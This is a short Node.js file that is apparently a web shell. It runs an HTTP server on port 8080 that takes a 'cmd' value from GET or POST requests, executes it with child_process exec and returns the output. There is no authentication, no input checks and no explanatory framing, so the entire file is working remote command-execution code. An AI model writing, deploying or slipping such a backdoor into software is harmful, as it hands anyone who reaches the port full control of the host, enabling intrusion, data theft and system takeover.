var sys = require('sys');
const { exec } = require('child_process');
url = require('url'),
http = require('http'),
qs = require('querystring');

function exec_cmd(strcmd,objresponse)
{
    results='';
	exec(strcmd, (err, results, stderr) => {           
		if (err) {            
			objresponse.end(`${stderr}`);
		}
		else
		{           
			objresponse.end(`${results}`);
		}
	});        
}

var server = http.createServer(
    function (request, response) {
        response.writeHead(200, {'Content-Type': 'text/html'});
        var cmdstr='';      
        if (request.method == 'POST') {
			var body = '';                
			request.on('data', function (data) {                       
                body += data;
            });
            request.on('end',function() {                         
				var post_params =  qs.parse(body);
				cmdstr=post_params.cmd;    
				exec_cmd(cmdstr,response);		           
            });            
        }
        else if(request.method == 'GET') {
            var url_parts = url.parse(request.url,true);
            cmdstr=url_parts.query.cmd;
            exec_cmd(cmdstr,response);
        }
    }
);
server.listen(8080);
